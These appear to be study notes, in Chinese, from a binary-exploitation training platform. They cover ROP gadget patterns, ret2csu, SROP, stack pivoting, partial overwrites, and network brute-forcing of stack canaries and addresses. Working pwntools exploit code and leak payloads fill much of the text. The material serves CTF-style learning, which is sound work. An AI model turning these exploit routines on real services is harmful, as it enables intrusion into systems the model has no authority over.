工具链：
- 模式：
    - `pop REG; ret` 设置寄存器/跳过无法控制或被覆盖的栈空间
        - `add rsp; ret` 移动栈指针，同样可跳过无法控制或无效的空间
    - `xchg REG1, REG2; ret` 交换寄存器
    - `syscall` 系统调用
    - `mov [REG1], REG2` 写入内存
    - `stosb` 写入内存：把寄存器 `al` 的1字节(`b`)，写到内存地址 `[rdi]`
        `stosq` 写入 `rax` 的8字节(`q`) 到内存
    - `xor REG, REG` 清空寄存器
    - `jmp REG` 控制流

- tips：
    - 调用现成函数（过程链接表（PLT）/重定位表（GOT）/函数指针）
        - `plt` 在设置参数后调用库的包装函数，作为跳转入口，相对手动 syscall 无需设置 rax
        - `got` 表仅保存函数指针
    - 获取 libc 基址后，即可使用 `__environ` 符号获取栈地址（保存在栈中的环境变量）
        - 还有 `__libc_stack_end`
    - 库函数本身使用底层系统调用，处理沙箱/过滤器时需注意
    - main ret +0x10 保存的栈地址值，距离 main ret 地址的偏移为 0xf0 (是否通用？)
    - 跳转目标：
        - 工具命令
        - 工具代码段
        - 被调函数在主调函数的参数设置阶段以重复执行，此时主调函数 rsp 在 leave 时恢复，从而可恢复各种储存在栈中的值，包括 argv/envp

            ```log
            Dump of assembler code for function __libc_start_main:
            # 保存 argv/envp 到栈
            0x0000000000023fa3 <+19>:    sub    rsp,0x98
            0x0000000000023faa <+26>:    mov    QWORD PTR [rsp+0x8],rdx
            0x0000000000023faf <+31>:    mov    rdx,QWORD PTR [rip+0x1c7f8a]        # 0x1ebf40
            0x0000000000023fb6 <+38>:    mov    QWORD PTR [rsp+0x18],rdi
            0x0000000000023fbb <+43>:    mov    rdi,r9
            0x0000000000023fbe <+46>:    mov    DWORD PTR [rsp+0x14],esi
            # 设置 main 的参数后调用
            0x0000000000024069 <+217>:   mov    rax,QWORD PTR [rip+0x1c7e40]        # 0x1ebeb0
            0x0000000000024070 <+224>:   mov    rsi,QWORD PTR [rsp+0x8]
            0x0000000000024075 <+229>:   mov    edi,DWORD PTR [rsp+0x14]
            0x0000000000024079 <+233>:   mov    rdx,QWORD PTR [rax]
            0x000000000002407c <+236>:   mov    rax,QWORD PTR [rsp+0x18]
            0x0000000000024081 <+241>:   call   rax
            0x0000000000024083 <+243>:   mov    edi,eax
            0x0000000000024085 <+245>:   call   0x46a40 <__GI_exit>
            ```
            - `__libc_start_main` 将参数保存到栈，并传递到 `main`，`main` 执行完成后返回到 `__libc_start_main`
                - 当 `main` 返回 `ret` 时，`rsp` 恢复为 `__libc_start_main` 原栈指针
                    - 此时的 `argv/envp` 命令参数/环境变量 数组指针将恢复

        - 爆破的预言机的提示：
            - 寻找可预测的落点（能稳定产生可辨识输出/行为），即拥有提示且同低三半字节的其他命令而不会阻塞，拥有 `exit` 则更加稳定
                - 查看/搜索 libc 库，定位目标预言机地址（此时的低3半字节已确认而可排除可能导致异常的其他低位地址，若爆破高位时存在阻塞则寻找另一个预言机）
                - 或者排除导致卡死的最后一个字节后，查看所有其他字节是否存在可预测性（猜想）
            
                ```sh
                0x241c0 <__libc_main>:       endbr64
                0x241c4 <__libc_main+4>:     push   rax
                0x241c5 <__libc_main+5>:     pop    rax
                0x241c6 <__libc_main+6>:     mov    edi,0x1
                0x241cb <__libc_main+11>:    mov    edx,0x1bb
                0x241d0 <__libc_main+16>:    lea    rsi,[rip+0x1939a9]        # 0x1b7b80 <banner>
                0x241d7 <__libc_main+23>:    sub    rsp,0x8
                0x241db <__libc_main+27>:    call   0x10e280 <__GI___libc_write>
                0x241e0 <__libc_main+32>:    xor    edi,edi
                0x241e2 <__libc_main+34>:    call   0xe3110 <__GI__exit>
                ```

                ```sh
                0x1b7b80 <banner>:      "GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.18) stable release version 2.31.\nCopyright (C) 2020 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.\nThere is NO w"...
                ```
            - `__assert_fail` 作为预言机似乎需栈对齐
            - `__stack_chk_fail` 似乎使用 `writev` 而不是普通 `write`

    - 在设置伪栈内容后，将栈迁移到更大的可控内存
        - rbp 到 rsp
            1. 设置 `rbp`
            2. `leave ; ret` 相当于 `mov rsp, rbp ; pop rbp ; ret`
                - :warning: 在设置 `rsp` 后，当前栈已经迁移至 `.bss` 伪栈，后续的 `pop rbp ; ret` 将对伪栈作用。即，应当设置在伪栈中。
        
    - 检查初始以及过程中的寄存器值是否可用，充分使用已有资源
    - 使用低3半字节不变的分页特性设置地址的低位覆盖，高位为原有的有效值，低位为固定与猜测值
    - 循环或递归的地址信息泄露，以及劫持控制流后的跳转到函数开头
        - 对于缺乏信息的复杂程序，使用 `puts` 泄露信息后跳转到 `_start`/`main`/`challenge` 进行下一轮，持续获得信息以构建最终载荷
            - 然而 `_start` 与 `main` 依赖“初始进程栈布局（`argc/argv/envp/auxv`）”；ROP 回去时 `rsp` 通常不是这个布局，会导致 `libc` 启动路径里对 `argv/env` 的访问崩掉。或许应当跳转到 `challenge` 这类普通函数
    - 可能的错误：
        - 对齐：栈上被 movaps 等使用 `XMM` 寄存器指令访问的内存地址，需满足16字节对齐
            - 调试中看到段错误包括 `XMM` 寄存器，且 `rsp` 地址为 8 的非对齐地址时，尝试对齐地址
        - syscall 寄存器覆盖：`rax/rcx/r11`：rax 返回值，rcx 返回地址，r11 保存的 flag
            - 直接 syscall 触发 suid 规则的降权
    
    - 使用其他 rop 查找工具确认位置存在后再使用 pwntool 的 ROP 对象获取地址而不是手动设置。例：
        ```py
        # 创建 elf 对象并设置地址后，创建 rop 对象，搜索命令工具并获得地址
        elf = ELF('/challenge/run')
        elf.address = 0x400000
        rop = ROP(elf)
        rdi_ret_addr = rop.find_gadget(['pop rdi', 'ret']).address
        payload += p64(rdi_ret_addr)
        ```
    - 若进行低位覆盖且地址差异不止一个半字节，确保所有差异位均被覆盖，否则爆破时差异但不变的高位地址导致一定无法对应
        - 覆盖 12 位 (2^12=4096)：

            ```py
            low_half = random.randint(0, 4095) * 0x1000
            low_total = low_half | leave_ret_addr_low3
            print(f"{low_total:#x}")

            payload += low_total.to_bytes(3, byteorder='little')
            ```
    - SROP 信号帧：

        ```py
        # 信号帧1
        payload += p64(rax_ret_addr)
        payload += p64(15)
        payload += p64(syscall_ret_addr)

        cur_rsp_addr = buf_stack_addr + len(payload)

        frame = SigreturnFrame()
        frame.rax = 90              # chmod 系统调用号
        frame.rdi = buf_stack_addr # 存有文件名字符串
        frame.rsi = 4               # 权限模式
        frame.rip = syscall_ret_addr # 控制流
        frame.rsp = cur_rsp_addr + len(frame) # 栈地址为帧载荷后
        payload += bytes(frame)
        
        # 信号帧2
        # 之前的信号帧返回后设置下一轮帧载荷调用
        payload += p64(rax_ret_addr)
        payload += p64(15)
        payload += p64(syscall_ret_addr)

        # 此处 exit 退出，无需计算或设置下一次的栈地址。若继续执行需设置

        frame = SigreturnFrame()
        frame.rax = 60
        frame.rdi = 77
        frame.rip = syscall_ret_addr
        payload += bytes(frame)
        ```
        - `libc` 库中拥有 `0x0000000000043090: mov rax, 0xf; syscall;`

查找工具链：对于复杂程序，重定向查找命令的输出到文件，之后在文件中搜索。而不是多次运行查找程序后 `grep`
- `objdump -R /challenge/server | egrep ' read@| write@'`  
    在程序被动态链接时，像 `close、accept、read、write` 这些来自 libc 的函数地址在程序启动前是未知的，它们被存储在全局偏移表（GOT）中。
    - `&puts@got` 属于“程序地址空间中的数据地址”；`*puts@got` 属于“libc 的代码地址”。
    - 若某函数已被调用过（或被提前解析），对应 `*func@got` 就是 libc 中该函数的地址，可用来反推出 libc base
    - 此时可使用所有 libc 函数

    很多 ret2csu 的 “call 段”形如：

    `call QWORD PTR [r15+rbx*8]`
    它需要你给一个“内存地址 r15”，里面存着函数指针。GOT 表项正好满足：

    `write@GOT/read@GOT` 里存着动态链接解析后的 `write/read` 实际地址

- `readelf -S /challenge/server | egrep '\.bss|\.data'`
    查 `.bss/.data` 等“固定可写内存”:

    `.bss` 是未初始化全局变量区：可写、地址固定（No PIE 时）、空间通常够大

    常用于：
    - 放其他阶段 ROP
    - 放字符串
    - 放 `read()` 读入的更多 payload（避免受最初文件长度/栈空间限制） 

- `ROPgadget --binary /challenge/server | grep -n "leave ; ret"`  
    ROPgadget：批量搜 gadget
    - 或 `rp++ --unique -r2 -f /challenge/server`
    - 或 `ropper --file /challenge/server`

    区分“干净 gadget”和“脏 gadget”
    - 干净：`leave ; ret` 前面没有别的会崩的副作用
    - 脏：像 `add byte ptr [rax], al ; leave ; ret`  
        这会写内存 `[rax]`，`rax` 不可控时非常容易 Bus error   

- `ret2csu` 的两段:

    - `pop` 段：`ROPgadget --binary /challenge/server | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15"`  
        一次性从栈里 `pop` 出一组寄存器（包括 `r12/r13/r14/r15` 等）

    
    - `call` 段：`objdump -d -M intel /challenge/server | grep -n "__libc_csu_init" -A80`  
        把 `r12/r13/r14` 搬运到 `edi/rsi/rdx`，再` call [r15+rbx*8]` 

       - `__libc_csu_init` 函数的末尾包含一系列连续的 pop 指令和 mov 指令。这些指令片段可以组合起来，实现对 rdi、rsi、rdx 这三个关键参数寄存器的控制。  


复刻程序构造工具链地址：
- ret2csu
    - ret2csu - call 从被调寄存器中设置调用寄存器并调用函数
        `objdump -d -M intel 程序路径字符串 | grep -n "__libc_csu_init" -A80`

        ```c
        964-  401f90:   4c 89 f2                mov    rdx,r14
        965-  401f93:   4c 89 ee                mov    rsi,r13
        966-  401f96:   44 89 e7                mov    edi,r12d
        967-  401f99:   41 ff 14 df             call   QWORD PTR [r15+rbx*8]
        968-  401f9d:   48 83 c3 01             add    rbx,0x1
        969-  401fa1:   48 39 dd                cmp    rbp,rbx
        970:  401fa4:   75 ea                   jne    401f90 <__libc_csu_init+0x40>
        971-  401fa6:   48 83 c4 08             add    rsp,0x8
        972-  401faa:   5b                      pop    rbx
        973-  401fab:   5d                      pop    rbp
        974-  401fac:   41 5c                   pop    r12
        975-  401fae:   41 5d                   pop    r13
        976-  401fb0:   41 5e                   pop    r14
        977-  401fb2:   41 5f                   pop    r15
        978-  401fb4:   c3                      ret
        ```
        
        注：
        - `call   QWORD PTR [r15+rbx*8]` 使用 `[r15+rbx*8]` 寄存器中存放的函数“指针”，而不是函数地址“值”
        - 若需多轮操作，在每轮收尾时添加 7 个填充值（从 `add rsp,0x8` 到 `pop r15`）
        - `mov edi,r12d` 仅转移低 32 位到 rdi，高位清零
        - 起始位置
            - 可从 `add rsp, 0x8` 开始，之后的所有链均使用固定的额外8字节填充
            - 或从 `pop rbx` 开始，根据是否为头部来判断是否需添加此8字节填充
        
        示例：

        ```py
        def ret2libc_fuc(rbx_0, rbp_loop, r12_edi, r13_rsi, r14_rdx, r15_fuc_ptr, head=False):
            pad_bytes = b'D' * 0x8
            payload = b''

            # 若为头部则从 pop 开始
            payload += p64(ret2libc_pop) if head else b''
            # 若非头部则拥有 add rep 的额外填充
            payload += pad_bytes if not head else b''
            # 寄存器段
            payload += p64(rbx_0)
            payload += p64(rbp_loop)
            payload += p64(r12_edi)
            payload += p64(r13_rsi)
            payload += p64(r14_rdx)
            payload += p64(r15_fuc_ptr)
            # 若为头部与中间则跳转到 set 设置并调用函数
            payload += p64(ret2libc_set)

            return payload
        ```

- 函数/片段地址
    本地复刻服务器 && 原版服务器：
    ```sh
    objdump -R server | egrep ' read@| write@'
    0000000000403f30 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5
    0000000000403f70 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
    0000000000403f68 R_X86_64_JUMP_SLOT  close@GLIBC_2.2.5
    0000000000403fc8 R_X86_64_JUMP_SLOT  accept@GLIBC_2.2.5

    hacker@integrated-security~the-watering-hole:~$ readelf -S server | egrep '\.bss|\.data'
    [24] .data             PROGBITS         0000000000404000  00003000
    [25] .bss              NOBITS           0000000000404020  00003010

    ROPgadget --binary server | grep -n "pop rbp"
    85:0x000000000040145d : pop rbp ; ret

    ROPgadget --binary server | grep -n "leave ; ret"
    62:0x000000000040154a : leave ; ret

    
    (gdb) x/30gx $rsp
    0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7faf6a0      0x0000000000000000
    0x404030 <stdin@@GLIBC_2.2.5>:  0x00007ffff7fae980      0x0000000000000000
    0x404040 <stderr@@GLIBC_2.2.5>: 0x00007ffff7faf5c0      0x0000000000000000
    0x404050:       0x0000000000000000      0x0000000000000000
    ```
    - bss中的 `stdin/stdout/stderr` 这些不是“文件描述符 0/1/2”，而是 glibc 里的全局变量 `FILE *stdin, *stdout, *stderr`。你的可执行文件如果引用了它们，动态链接器会通过 COPY relocation（拷贝重定位） 在主程序的 `.bss/.data` 里为它们分配槽位，并在启动时把 `libc` 里的初始值“拷贝”过来，于是它们正好落在 `.bss` 起始处:
        ```sh
        hacker@integrated-security~the-watering-hole:~$ nm server | egrep 'stdin|stdout|stderr'
        0000000000402000 R _IO_stdin_used
        0000000000404040 B stderr@@GLIBC_2.2.5
        0000000000404030 B stdin@@GLIBC_2.2.5
        0000000000404020 B stdout@@GLIBC_2.2.5
        ```
        - 使用bss时不应当设置为bss的起始处


- 地址爆破
    - hit 命中爆破：
        - 唯一正确预言
        ```py
        def addr_bf(addr_len, pad_bytes, addr_int, hit_str, start_str, quit_str):
            """
            addr_len 字节长度
            pad_bytes 填充
            addr_int 已知地址
            hit_str 命中字符串
            start_str 起始提示字符串
            quit_str 结束命令字符串
            """

            if addr_int == None:
                addr_bytes = b''
            else:
                addr_bytes = bytes([addr_int & 0xff])

            # 使用字节列表以减少类型转换
            byte_list = [bytes([i]) for i in range(256)]

            for _ in range(addr_len):
                payload_bytes = pad_bytes + addr_bytes
                found_flag = False

                for cur_test_byte in byte_list:

                    p = get_net_client_process()

                    test_addr_payload_bytes = payload_bytes + cur_test_byte

                    p.recvuntil(start_str)
                    p.send(test_addr_payload_bytes)
                    time.sleep(0.0001)

                    p.sendline(quit_str)

                    r = p.recvall(timeout=0.0001)
                    # print(f"cur test addr {cur_test_byte} ", r)
                    if hit_str in r:
                        found_flag = True
                        addr_bytes = addr_bytes + cur_test_byte
                        print(f"hit {int.from_bytes(cur_test_byte, byteorder='little'):#x}")    
                        print(f"cur_addr {int.from_bytes(addr_bytes, byteorder='little'):#x}")
                        break
                
                if found_flag == False:
                    raise ValueError("no match")
                    
            return addr_bytes
        ```
    
    - miss 排除爆破：
        - 逐渐排除异常
        ```py
        def bru_bytes(payload, num):
            byte_list = [bytes([i]) for i in range(256)]
            match_list = [b'']
            for k in range(num):
                test_list = [e+byte for byte in byte_list for e in match_list]
                # print("test_list: \n", test_list)
                match_list = []
                for cur_test_bytes in test_list:
                    p = get_net_client_process()

                    test_payload = payload + cur_test_bytes
                    # print("test_payload: \n", test_payload)

                    p.send(test_payload)
                    # p.recvuntil(b'Leaving')
        
                    res = p.recvall(timeout=0.3)
                    
                    if b'stack smashing detected' not in res:
                        # print(f'hit: ', cur_test_bytes)
                        match_list.append(cur_test_bytes)

                    p.close()
                print("mid match_list: \n", match_list)

            print("final match_list: \n", match_list)
            return match_list
        ```
- 基址计算
    ```py
    from pwn import *

    # 复用的数据泄露函数，仅发送载荷获取响应
    def attack(payload, start_str, quit_str):

        p = get_net_client_process()

        p.recvuntil(start_str)
        p.send(payload)
        time.sleep(0.001)

        p.sendline(quit_str)

        r = p.recvall(timeout=0.001)
        return r

    # buf 基址到金丝雀的距离
    pad_bytes = 0x77 * b'\x00'

    # 爆破前降低日志详细程度
    context.log_level = "error"
    # 爆破金丝雀
    canary_bytes = addr_bf(8, pad_bytes, None)
    canary_int = int.from_bytes(canary_bytes, byteorder='little')
    print(f">>>> canary_int {canary_int:#x}")

    # 将金丝雀加入填充字节
    pad_bytes += p64(canary_int).ljust(0x10, b'\x00')

    # 指令在文件中的偏移
    ins_offset_int= 0x1337

    # 爆破或泄露得到指令运行时地址
    ins_addr_bytes = addr_bf(6, pad_bytes, ins_offset_int)
    ins_addr_int = int.from_bytes(ins_addr_bytes, byteorder='little')
    print(f">>>> ins_addr_int {ins_addr_int:#x}")

    # 完成爆破后恢复日志详细程度
    context.log_level = "debug"

    # 构建 elf 对象，并设置基址 = 指令运行时地址 - 指令文件偏移
    elf = ELF("/challenge/run")
    elf.address = ins_addr_int - ins_offset_int

    # 使用 rop 对象获取命令工具的地址
    rop = ROP(elf)
    rop_rdi_ret_addr = rop.find_gadget(["pop rdi", "ret"]).address

    # 得到 puts 的 plt 调用入口，以及 got 指针表地址
    puts_elf_plt = elf.plt['puts'] 
    puts_elf_got = elf.got['puts']
    print(f"puts_elf_plt {puts_elf_plt:#x}")
    print(f"puts_elf_got {puts_elf_got:#x}")

    # 设置参数后使用 puts(puts_elf_got)  得到数据段的 got 表中保存的 libc 地址
    payload_get_libc = b''.join([pad_bytes,
        p64(rop_rdi_ret_addr),
        p64(puts_elf_got),
        p64(puts_elf_plt)
        ])
    puts_libc_addr_bytes = attack(payload_get_libc)[-7:-1]
    puts_libc_addr_int = int.from_bytes(puts_libc_addr_bytes, 'little')
    print(f'>>>> puts_libc_addr_int = {puts_libc_addr_int:#x}')

    # 创建库文件对象，使用 got 表中存放的 puts libc 地址设置 libc 基址
    libc_filepath = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
    libc_elf = ELF(libc_filepath)

    puts_libc_file_offset = libc_elf.symbols['puts']
    libc_elf.address = puts_libc_addr_int - puts_libc_file_offset

    # libc 中的 env 环境变量保存栈地址
    env_libc_addr = libc_elf.symbols["__environ"]
    print(f"env_libc_addr {env_libc_addr:#x}")

    # 设置参数使用 puts(env) 获取栈地址 
    payload_get_stack = b''.join([pad_bytes,
        p64(rop_rdi_ret_addr),
        p64(env_libc_addr),
        p64(puts_elf_plt)
    ])
    stack_addr_bytes = attack(payload_get_stack)[-7:-1]
    stack_addr_int = int.from_bytes(stack_addr_bytes, 'little')
    print(f'>>>> stack_addr_int = {stack_addr_int:#x}')

    # 使用 gdb 得到自选位置的栈地址，并使用泄露的栈地址计算相对偏移
    old_stack_addr_int = 0xdead # 泄露 env 栈
    old_target_stack_addr = 0xbeef # 自选 gdb 调试
    target_stack_offset = old_stack_addr_int - old_target_stack_addr
    # 之后得到泄露的栈地址后使用相对地址得到运行时栈地址
    stack_prog_buf_base = stack_addr_int - target_stack_offset - 0x0
    ```